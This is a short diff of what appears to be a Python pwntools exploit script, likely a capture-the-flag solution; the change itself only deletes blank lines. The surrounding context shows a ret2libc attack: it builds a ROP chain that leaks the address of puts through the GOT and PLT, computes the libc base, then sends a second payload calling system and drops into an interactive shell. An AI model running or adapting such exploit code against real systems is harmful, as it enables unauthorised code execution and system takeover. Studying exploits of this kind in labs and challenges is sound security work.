@@ -28,7 +28,6 @@ p += p64((u64(EFF_BASE) & ~0xfff) + puts_got)
 p += p64((u64(EFF_BASE) & ~0xfff) + puts_plt)
 p += p64((u64(EFF_BASE) & ~0xfff) + 0x88a)
 
-
 r.sendline(p)
 
 LIBC_BASE = int.from_bytes(r.recv().split()[2], byteorder='little') - puts_lib
@@ -47,6 +46,3 @@ p += p64(ADDR_SYSTEM)
 
 r.sendline(p)
 r.interactive()
-
-
-
